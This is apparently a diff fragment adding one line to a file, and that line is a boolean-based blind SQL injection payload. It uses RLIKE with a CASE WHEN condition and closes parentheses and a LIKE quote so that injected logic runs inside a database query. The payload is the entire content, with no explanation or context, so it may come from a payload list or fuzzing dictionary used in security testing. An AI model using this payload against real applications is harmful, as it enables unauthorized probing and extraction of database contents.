@@ -1,0 +1,1 @@
+1%'))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ((('%'='
